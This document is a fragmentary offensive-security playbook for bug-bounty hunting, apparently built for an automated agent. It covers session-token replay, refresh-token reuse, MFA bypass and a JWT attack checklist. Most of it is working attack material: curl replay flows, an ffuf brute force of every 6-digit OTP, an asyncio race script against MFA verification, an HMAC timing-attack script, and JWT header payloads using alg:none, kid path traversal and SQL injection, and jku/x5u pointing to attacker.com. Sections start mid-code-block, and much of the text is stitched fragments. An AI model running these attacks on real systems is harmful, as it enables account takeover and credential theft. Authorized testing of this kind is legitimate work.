curl -s -L -c "$JAR_B" -X POST "https://$TARGET/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@example.com","password":"OldPass!1"}' -o /dev/null


# 3) Victim (session B) changes the password.
curl -s -L -b "$JAR_B" -X POST "https://$TARGET/api/change-password" \
  -H 'Content-Type: application/json' \
  -d '{"old_password":"OldPass!1","new_password":"BrandNew!2"}' -o /dev/null


# 4) THE TEST: replay the OLD SESSION_A captured in step 1.
AFTER=$(curl -s -L -H "Cookie: $SESSION_A" "https://$TARGET/api/profile" -w '\n[%{http_code}]')
echo "AFTER pw-change: $AFTER"
```
**Decision + FP discipline:**
- Finding is confirmed only if `AFTER` returns 200 **and** the body still carries the account's unique data (body-diff vs `BEFORE`). A bare 200 on a public/SPA route is not proof.
- Run the **garbage-cookie negative control** again to prove the endpoint is session-gated.
- Repeat the identical flow for **email-change** (`/settings/email`) and for **logout-all-devices** — apps frequently invalidate the *acting* session (B) but not *sibling* sessions (A). That sibling-survival is the exact persistent-ATO primitive `hunt-ato` chains.
- **Severity gate:** if the change-password endpoint also lacks a current-password / MFA step-up (per `hunt-mfa-bypass`), A can pivot from read-only to full takeover → escalate.


### Phase 4 — Cookie Attribute Analysis
```bash
curl -sI -L "https://$TARGET/" | grep -i '^set-cookie'
```
- **HttpOnly** missing → cookie reachable via `document.cookie`. Only a finding **chained to a real XSS/DOM sink** (`hunt-xss`/`hunt-dom`) — note it, don't report standalone as High.
- **Secure** missing → cookie sent over cleartext HTTP; pair with `hunt-tls-network` (downgrade/HSTS-gap) for a network-attacker chain.
- **SameSite** missing/`None` → CSRF reachability; `SameSite=Lax` is bypassable via sibling-subdomain top-level navigation (Argo CD **CVE-2024-22424** class) → hand to `hunt-csrf`.
- **`__Host-` / `__Secure-` prefix absent** → the session can be overwritten/fixated from a subdomain or non-secure context; its presence largely kills cookie-fixation, so flag the *absence* as the precondition for Phase 1.


# /login often sets the cookie on the redirect target, not the first response.
N=200; SAMP=$(mktemp)
for i in $(seq 1 $N); do
  J=$(mktemp)
  curl -s -L -c "$J" "https://$TARGET/login" -o /dev/null
  get_cookie "$J" | cut -d= -f2- >> "$SAMP"
  rm -f "$J"
done
sort "$SAMP" | uniq -d | head            # duplicates = catastrophic (re-use)
awk '{print length($0)}' "$SAMP" | sort -n | uniq -c   # length distribution
```
Then analyse, don't eyeball:
- **Sequential / monotonic** — `sort -n` the decoded values; a steady +1/+N delta = predictable.
- **Decodable structure** — `base64 -d` / hex-decode each ID and look for embedded `userId`, unix timestamps, or PIDs.
- **Bit entropy** — feed the raw bytes to `ent` or `dieharder`; NIST SP 800-63B wants ≥64 bits. 10 samples is far too few to claim anything — gather hundreds.
- **FP guard:** a long random-*looking* token is not proof of strength; only structural decode + a large-sample entropy estimate is. Conversely a short token with high per-char entropy may still be fine — measure, don't count characters.


### Phase 6 — JWT-as-Session
```bash
JWT="eyJ..."        # captured from Authorization: Bearer or a cookie


# Decode header + payload safely (base64url padding fix).
b64url(){ local s="${1//-/+}"; s="${s//_//}"; printf '%s' "$s===" | base64 -d 2>/dev/null; }
b64url "$(cut -d. -f1 <<<"$JWT")" | jq .   # header: alg, kid
b64url "$(cut -d. -f2 <<<"$JWT")" | jq .   # claims: exp, iat, sub, jti
```
- **`exp` missing or years out** → no expiry. **`jti` missing** → server cannot maintain a revocation list → logout can't truly revoke.
- **Revocation test:** logout, then replay the *same* JWT against `/api/me`. If it still returns the user → tokens are not server-revocable; this is the JWT-session persistence finding. Body-diff to avoid a cached 200.
- **Tampering (alg/kid/key-confusion) is owned by `hunt-api-misconfig`** — hand off `jwt_tool $JWT -T` / `-X a` there rather than duplicating it.


# 1) Obtain a refresh token (login or /oauth/token), then rotate it once.
RT1=$(curl -s -L -X POST "https://$TARGET/api/login" \
  -H 'Content-Type: application/json' \
  -d '{"email":"victim@example.com","password":"OldPass!1"}' | jq -r '.refresh_token')


# 2) Use RT1 to mint a new access token — server SHOULD return a rotated RT2.
R2=$(curl -s -L -X POST "https://$TARGET/auth/refresh" \
  -H 'Content-Type: application/json' -d "{\"refresh_token\":\"$RT1\"}")
RT2=$(jq -r '.refresh_token' <<<"$R2"); echo "rotated? RT1!=RT2 -> $([ "$RT1" != "$RT2" ] && echo yes || echo NO-ROTATION)"


# 3) REUSE-DETECTION test: replay the OLD RT1 again (simulating the leaked token).
REPLAY=$(curl -s -L -X POST "https://$TARGET/auth/refresh" \
  -H 'Content-Type: application/json' -d "{\"refresh_token\":\"$RT1\"}" -w '\n[%{http_code}]')
echo "RT1 replay: $REPLAY"


# 4) Then confirm RT2 was KILLED by the replay (correct BCP behaviour invalidates


#    the whole family). If RT2 still works after RT1 was replayed → no family-revocation.
curl -s -L -X POST "https://$TARGET/auth/refresh" \
  -H 'Content-Type: application/json' -d "{\"refresh_token\":\"$RT2\"}" -w '\n[%{http_code}]'
```
**Findings:** no rotation (RT1==RT2) = a long-lived stealable credential; rotation **without** reuse-detection (RT1 replay still mints tokens, or RT2 survives the replay) = the leaked-token-persistence bug per the OAuth Security BCP. **OOB note:** if you suspect a leaked RT via SSRF/log/JS-bundle, confirm the token's reach with `hunt-ssrf`/`hunt-source-leak`, not by guessing.


#  strip the device-bound proof header and replay the plain cookie:
curl -s -L -H "Cookie: $A" "https://$TARGET/api/me" -w '\n[%{http_code}]'


#  If the plain (non-bound) cookie is still accepted → device-binding is advisory,


#  not enforced → a stolen cookie defeats DBSC entirely.
```
Hand OAuth `state`/`redirect_uri`/code-injection to `hunt-oauth`; this phase only covers the *session-layer* binding.

---


## Chain Table

| Session finding | Chain to | Impact |
|----------------|----------|--------|
| Session fixation (forced `__Host-`-less cookie) | Trick admin/SSO user into authenticating on planted ID | Admin session takeover (Critical) |
| No logout/password-change invalidation | `hunt-xss`/`hunt-dom` cookie theft → replay surviving session | Persistent ATO past victim's reset |
| Refresh token, no reuse-detection | Leaked RT (SSRF/log/bundle) → infinite access-token minting | Persistent ATO, survives password change |
| `SameSite=Lax` only | Sibling-subdomain top-level nav (CVE-2024-22424 class) → CSRF | State change / login-CSRF → fixation |
| JWT no `exp`/`jti` | Stolen token, no server revocation | Permanent access |
| DBSC downgrade accepted | Steal plain cookie despite device-binding | Defeats the only theft mitigation |
| Predictable ID | Compute/brute another user's session | Cross-user ATO |

---


## Validation (house FP discipline)

Before claiming ANY session finding:
- **Two real sessions, not placeholders** — every fixation/invalidation claim uses A and B captured by the `curl` flows above.
- **Body-diff, never status-only** — a 200 means nothing without the account's unique identity marker present in the body, diffed against the authenticated baseline.
- **Negative control** — a garbage/random cookie must FAIL where your "surviving" cookie succeeds; otherwise the endpoint isn't session-gated and it's a non-finding.
- **Cache/edge check** — re-request with a cache-buster and from a second IP; rule out an edge-cached or IP-pinned 200.
- **OOB for theft chains** — when the impact depends on exfiltrating a cookie/token (XSS, SSRF, log leak), confirm receipt out-of-band (Collaborator) rather than asserting it.
- **Static-vs-state** — `HttpOnly`/`Secure`/`SameSite` absence is a *policy* observation; only report as High once paired with a real exploit primitive (XSS, network-MITM, CSRF). Standalone attribute gaps are Low/Informational.

**Severity:**
- Session fixation → admin/SSO takeover: **Critical**
- No invalidation on password/email change, or refresh-token reuse without detection: **High → Critical** (escalate if MFA/step-up also absent)
- Predictable/duplicate session ID: **High**
- No invalidation on logout: **Medium → High** (depends on theft vector)
- Missing `HttpOnly`/`SameSite` standalone: **Low/Informational** until chained


## 19. MFA / 2FA BYPASS
> Growing bug class — 7 distinct patterns. Pays High/Critical when it enables ATO without prior session.


# Test with ffuf — all 1M 6-digit codes
ffuf -u "https://target.com/api/verify-otp" \
  -X POST -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"otp":"FUZZ"}' \
  -w <(seq -w 000000 999999) \
  -fc 400,429 -t 5


### Pattern 2: OTP Not Invalidated After Use
```
1. Login → receive OTP "123456" → enter it → success
2. Logout → login again with same credentials
3. Try OTP "123456" again
4. If accepted → OTP never invalidated = ATO (attacker sniffs OTP once, reuses forever)
```


### Pattern 3: Response Manipulation
```
1. Enter wrong OTP → capture response in Burp
2. Change {"success":false} → {"success":true} (or 401 → 200)
3. Forward → if app proceeds → client-side only MFA check
```


# If app grants access without MFA = auth flow bypass = Critical
curl -s -b "session=PRE_MFA_SESSION" https://target.com/dashboard
```


### Pattern 5: Race on MFA Verification
```python
import asyncio, aiohttp

async def verify(session, otp):
    async with session.post("https://target.com/api/mfa/verify",
                            json={"otp": otp}) as r:
        return r.status, await r.text()

async def race():
    cookies = {"session": "YOUR_SESSION"}
    async with aiohttp.ClientSession(cookies=cookies) as s:
        # Fire ~30 concurrent submissions of the SAME OTP to hit the TOCTOU
        # window before the server marks it used. Two requests are NOT enough —
        # they almost always resolve sequentially as "already-used" (false negative).
        # Best done as a single-packet / 20+ HTTP-2-stream attack (Turbo Intruder).
        results = await asyncio.gather(*[verify(s, "123456") for _ in range(30)])
        # Race confirmed if >1 success (or 1 success among many "already-used").
        for status, body in results:
            print(status, body)
asyncio.run(race())
```


### Pattern 6: Backup Code Brute Force
```
Backup codes: typically 8 alphanumeric = 36^8 = ~2.8T (too large)
BUT: check if backup codes are only 6-8 digits = 1-10M range = feasible with no rate limit
Also test: can backup codes be reused after exhaustion? Some apps regenerate predictably.
```


### Pattern 7: "Remember This Device" Trust Escalation
```
1. Complete MFA once on Device A (attacker's browser)
2. Capture the "remember device" cookie
3. Present that cookie from a new IP/browser
4. If MFA skipped = device trust not bound to IP/UA = ATO from any location
```


### MFA Chain Escalation
```
Rate limit bypass + no lockout = ATO (Critical)
Response manipulation = client-side only check = Critical
Skip MFA step = auth flow bypass = Critical
OTP reuse = persistent session hijack = High
```

---


## Overview

Comprehensive JWT attack checklist for offensive security engagements. Follow steps in order; apply each technique to the current target context and track which items have been completed.


## Quick Reference: Misconfigurations to Check

- Algorithm set to `none` — signature verification bypassed entirely
- Algorithm switching between `RSA` and `HMAC` (confusion attack)
- Weak or guessable HMAC secret (brute-forceable)
- `kid`, `jku`, `jwk`, `x5u` header parameters accepted without validation
- Expired or tampered tokens accepted by server
- Sensitive data stored unencrypted in payload

Useful tool: [JWT Tool](https://github.com/ticarpi/jwt_tool)


## Mechanisms

JWTs (RFC 7519) consist of three Base64URL-encoded parts: `header.payload.signature`.

**Signing algorithms:**

| Algorithm | Type | Notes |
|-----------|------|-------|
| HS256/384/512 | Symmetric HMAC | Shared secret; confusion target |
| RS256/384/512 | Asymmetric RSA | Public key can be misused as HMAC secret |
| ES256/384/512 | Asymmetric ECDSA | |
| PS256/384/512 | RSASSA-PSS | |
| EdDSA (Ed25519/Ed448) | Asymmetric | |
| none | Unsigned | Critically insecure |

**Additional pitfalls:**
- JWS/JWE confusion: server accepts encrypted token (JWE) where signed (JWS) is expected, or fails open on unexpected `typ`/`cty`
- JWKS retrieval: SSRF via `jku`/`x5u`, insecure TLS, poisoned key caching, `kid` collisions
- Token binding (DPoP, mTLS): incorrectly implemented allows replay from other clients


## Hunt: Identifying JWT Usage

1. Check `Authorization: Bearer <token>` headers in all requests
2. Look for cookies containing JWT structures (`eyJ...`)
3. Examine browser local/session storage
4. Decode the token at jwt.io or via BurpSuite JWT extension — inspect claims and header parameters
5. Note any `kid`, `jku`, `jwk`, `x5u` fields in the header — these are attack surfaces


## Vulnerability Map

```
JWT Vulnerabilities
├── Algorithm Bypass
│   ├── alg:none attack
│   └── RS256→HS256 confusion (public key as HMAC secret)
├── Weak Secret Key → Brute force
├── kid Parameter Injection
│   ├── SQL injection via kid
│   └── Path traversal via kid
├── Header Injection
│   ├── jwk (inline fake key)
│   ├── jku/x5u (remote attacker-controlled JWKS)
│   └── JWKS cache poisoning
└── Missing / Broken Validation
    ├── No signature check
    ├── Expired tokens accepted
    └── iss/aud/exp not validated
```


### Algorithm Vulnerabilities

- **alg:none** — Some libraries disable signature validation when `alg` is `none` or a case variant (`None`, `NONE`, `nOnE`)
- **Algorithm Confusion (RS256→HS256)** — Server uses RSA public key as HMAC secret when attacker switches `alg` to HS256; attacker re-signs token with the public key
- **Key ID (`kid`) Manipulation** — Exploiting `kid` to load wrong keys or inject file paths / SQL; enforce strict lookups


### Signature Vulnerabilities

- **Weak HMAC Secrets** — Brute-forceable with dictionary or hashcat
- **Missing Signature Validation** — Token accepted without any verification
- **Broken Validation** — Implementation errors in signature checking logic


### Implementation Issues

- **Missing Claims Validation** — `exp`, `nbf`, `aud`, `iss` not verified
- **Insufficient Entropy** — Predictable JWT IDs or tokens
- **No Expiration** — Tokens valid indefinitely
- **Insecure Transport** — Token sent over HTTP
- **Debug Leakage** — Detailed error messages expose implementation


### Header Injection Attacks

- **JWK Injection** — Supply a custom attacker-controlled public key via the `jwk` header
- **JKU Manipulation** — Point `jku` (JWK Set URL) to attacker-controlled JWKS endpoint
- **x5u Misuse** — Load untrusted X.509 key URL; exploit lax TLS validation or open redirects
- **JWKS Cache Poisoning** — Force caches to accept attacker keys via `kid` collisions or response header manipulation
- **`crit` Header Abuse** — Server ignores unknown critical parameters, enabling bypass


### Information Disclosure

- Sensitive data (PII, credentials, session details) stored unencrypted in payload
- Internal service/backend information leaked via claims


### Mobile App JWT Storage

**Android:**
- `SharedPreferences`: Check if world-readable; location `/data/data/<package>/shared_prefs/`
- Keystore extraction: root device or exploit app
- Backup extraction: `adb backup -f backup.ab <package>` (if `allowBackup=true`)
- Tools: Frida, objection, MobSF

**iOS:**
- Keychain: Check `kSecAttrAccessible` — `kSecAttrAccessibleAlways` is insecure
- iTunes/iCloud backup extraction: unencrypted backups expose Keychain
- Jailbreak + Keychain-Dumper for full extraction
- Tools: Frida, objection, idb

**React Native / Hybrid:**
- `AsyncStorage` stored in plain text (Android SQLite DB, iOS plist); no encryption by default

```bash


# Android — check SharedPreferences
adb shell "run-as com.target.app cat /data/data/com.target.app/shared_prefs/auth.xml"


### JWT Confusion Attacks

- **SAML-JWT Confusion** — App accepts both SAML and JWT; send JWT where SAML expected or vice versa to exploit weaker validation path
- **API Key-JWT Confusion** — Test sending JWT where API key expected and vice versa
- **Session Cookie-JWT Hybrid** — Test expired JWT with valid session cookie; inject JWT claims into session
- **OAuth Token Confusion** — Send ID token (JWT) to resource server expecting opaque access token

```bash


# Try API key where JWT expected
curl -H "Authorization: Bearer <api_key>" https://api.target/resource


# Try JWT where API key expected
curl -H "X-API-Key: <jwt_token>" https://api.target/resource
```


### Timing Attacks on HMAC

Non-constant-time comparison leaks the HMAC secret character by character via response time differences.

```python
import requests, time

def time_request(signature):
    start = time.perf_counter()
    r = requests.get('https://target/api',
                     headers={'Authorization': f'Bearer header.payload.{signature}'})
    return time.perf_counter() - start


# Brute-force first byte — longer response time indicates correct byte
for byte in range(256):
    sig = bytes([byte]) + b'\x00' * 31
    t = time_request(sig.hex())
```


### JWT in URL Parameters

- Tokens in GET URLs appear in server logs, proxy logs, browser history
- Leaked via `Referer` header to external sites; CDN/cache logs may persist tokens

```bash
curl "https://api.target/resource?token=eyJ..."
curl "https://api.target/resource?access_token=eyJ..."
curl "https://api.target/resource?jwt=eyJ..."
```

Check Wayback Machine for historical URLs with tokens; monitor Referer headers to third-party analytics.


## Manual Testing Steps

1. **Decode and Inspect:**
   ```
   base64url_decode(header) . base64url_decode(payload) . signature
   ```

2. **Test `none` Algorithm** (try all case variants):
   ```
   {"alg":"none","typ":"JWT"}.payload.""
   {"alg":"None","typ":"JWT"}.payload.""
   {"alg":"NONE","typ":"JWT"}.payload.""
   {"alg":"nOnE","typ":"JWT"}.payload.""
   ```

3. **Algorithm Confusion (RS256→HS256):**
   ```
   # Re-sign with RSA public key used as HMAC secret
   {"alg":"HS256","typ":"JWT","kid":"expected-key"}.payload.<re-signed-with-public-key-as-secret>
   ```

4. **kid Parameter Attacks:**
   ```
   {"alg":"HS256","typ":"JWT","kid":"../../../../dev/null"}
   {"alg":"HS256","typ":"JWT","kid":"file:///dev/null"}
   {"alg":"HS256","typ":"JWT","kid":"' OR 1=1 --"}
   ```

5. **JWK/JKU Injection:**
   ```
   {"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","e":"AQAB","kid":"attacker-key","n":"..."}}
   {"alg":"RS256","typ":"JWT","jku":"https://attacker.com/jwks.json"}
   ```

6. **x5u / crit Handling:**
   ```
   {"alg":"RS256","typ":"JWT","x5u":"https://attacker.com/cert.pem"}
   {"alg":"RS256","typ":"JWT","crit":["exp"],"exp":null}
   ```

7. **Brute Force HMAC Secret:**
   ```bash
   python3 jwt_tool.py <token> -C -d wordlist.txt
   ```

8. **Test Missing Claim Validation:**
   - Remove or modify `exp` (expiration)
   - Change `iss` (issuer) or `aud` (audience)
   - Modify `iat` (issued at) or `nbf` (not before)


# Targeted attacks
python3 jwt_tool.py <token> -X a     # Algorithm confusion
python3 jwt_tool.py <token> -X n     # Null/none signature
python3 jwt_tool.py <token> -X i     # Identity theft
python3 jwt_tool.py <token> -X k     # Key confusion


# Crack HMAC secret
python3 jwt_tool.py <token> -C -d wordlist.txt
```

**Other tools:**
- JWT.io — basic token inspection and debugging
- Burp Suite JWT Scanner / JWT Editor extension — automated testing and token editing
- jwtXploiter — advanced JWT vulnerability scanning
- c-jwt-cracker — high-speed HMAC brute force (C implementation)
- Frida, objection, MobSF — mobile JWT extraction


## Remediation Recommendations

- Use short-lived access tokens; rotate refresh tokens frequently
- Always validate `aud` (audience) and `iss` (issuer) claims
- Disable `none` algorithm; prevent algorithm downgrades; pin `alg` per client/issuer
- Ensure key material loaded for verification matches `alg`; reject mismatches
- Reject tokens with unknown `crit` header parameters
- Validate JWKS over pinned TLS; disallow remote `jku`/`x5u` except trusted domains; short-TTL key caching with `kid` uniqueness
- Enforce maximum token length; disable JWE compression unless required
- Maintain server-side deny-list keyed by `jti` for early revocation
- For DPoP tokens (`typ:"dpop+jwt"`): verify proof binds to HTTP request; enforce one-time nonce use
- Bind sessions to device when possible; rotate refresh tokens on every use
- Prefer `SameSite=Lax/Strict` HttpOnly cookies for web; avoid localStorage for access tokens


## Alternatives & Modern Mitigations

- **PASETO** — removes algorithm negotiation entirely; eliminates confusion attacks
- **Macaroons** — bearer tokens with attenuable, caveat-based delegation
- **DPoP and mTLS** — bind tokens to the client to prevent replay

